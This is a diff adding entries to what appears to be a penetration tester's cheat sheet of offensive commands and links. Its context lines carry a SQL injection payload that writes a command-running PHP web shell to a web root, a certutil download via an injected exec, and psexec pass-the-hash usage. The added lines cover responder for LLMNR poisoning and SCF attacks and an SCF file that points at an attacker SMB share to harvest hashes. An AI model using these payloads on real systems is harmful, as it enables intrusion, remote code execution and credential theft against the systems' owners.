@@ -18,6 +18,9 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
 [sql injection cheat sheet]
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 
+[sql trucation attack]
+https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html
+
 [sql bypass characters exfiltration]
 '+UNION+SELECT+char(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,109,100,39,93,63,62),null+into+outfile+'/var/www/html/shell.phtml'-- -
 
@@ -174,6 +177,9 @@ http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.1
 [psexec]
 psexec.py -hashes LM:NTLM administrator@10.200.200.127
 psexec.pt domain/username:password@10.10.10.10
+
+[LM empty string]
+aad3b435b51404eeaad3b435b51404ee
 
 [nikto cheatsheet]
 https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/
@@ -523,8 +529,11 @@ https://github.com/TBGSecurity/splunk_shells
 * POC
 https://www.n00py.io/2018/10/popping-shells-on-splunk/
 
-[responder: LLMNR poisoning]
+[responder]
+# LLMNR Poisoning
 responder -I tun0 -rdwv
+# SCF Attack
+responder -wrf --lm -v -I tun0
 
 [wpscan]
 * enumerate user and plugins(passive)
@@ -662,3 +671,11 @@ Get-ADUser -Identity asalam
 Get-DomainUser
 # List all group members
 Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
+
+[scf attack]
+```
+[Shell]
+IconFile=\\10.10.14.12\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+```
